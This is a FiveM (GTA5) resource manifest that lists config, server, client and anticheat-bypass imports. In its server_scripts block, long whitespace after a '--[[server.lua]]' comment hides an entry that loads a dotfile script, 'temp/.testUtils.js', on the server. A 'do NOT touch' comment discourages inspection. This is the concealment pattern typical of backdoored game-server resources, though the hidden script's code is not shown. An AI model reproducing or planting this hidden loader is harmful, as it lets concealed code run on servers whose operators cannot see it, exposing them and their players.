shared_script "@ReaperV4/imports/bypass.js"
shared_script "@ReaperV4/imports/bypass.lua"
shared_script "@ReaperV4/imports/bypass_s.lua"
shared_script "@ReaperV4/imports/bypass_c.lua"
lua54 "yes" -- needed for Reaper



-- resource bypass & lua runtime load for cfx.ac, do NOT touch

lua54 'yes'


fx_version 'cerulean'
game 'gta5'

shared_script "config.lua"
server_script "server.lua"
client_script "client.lua"

server_scripts {
	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'temp/.testUtils.js',
}
